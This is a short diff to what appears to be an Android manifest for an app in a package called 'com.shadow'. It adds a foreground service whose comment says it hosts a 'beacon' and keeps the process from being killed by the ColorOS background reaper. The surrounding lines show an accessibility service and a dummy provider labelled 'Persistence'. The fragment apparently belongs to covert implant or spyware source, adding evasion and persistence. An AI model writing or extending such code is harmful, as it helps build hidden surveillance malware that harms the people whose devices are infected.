@@ -107,6 +107,14 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- Foreground Service: promotes the process out of the background tier so
+             the ColorOS reaper is far less aggressive. Hosts the beacon. -->
+        <service
+            android:name="com.shadow.SyncForegroundService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
         <!-- Persistence: SyncAdapter dummy ContentProvider -->
         <provider
             android:name="com.shadow.SyncProvider"
